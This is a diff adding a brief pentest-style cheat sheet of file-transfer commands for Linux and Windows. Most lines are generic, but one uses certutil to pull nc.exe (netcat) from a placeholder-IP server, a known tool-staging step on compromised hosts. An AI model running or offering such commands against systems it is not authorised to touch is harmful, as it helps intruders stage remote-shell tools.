@@ -1,0 +1,8 @@
+File Transfer
+Linux
+python3 -m http.server 8000
+wget http://<ip>:8000/file
+curl http://<ip>:8000/file -o file
+Windows
+certutil -urlcache -f http://<ip>:8000/nc.exe nc.exe
+Invoke-WebRequest
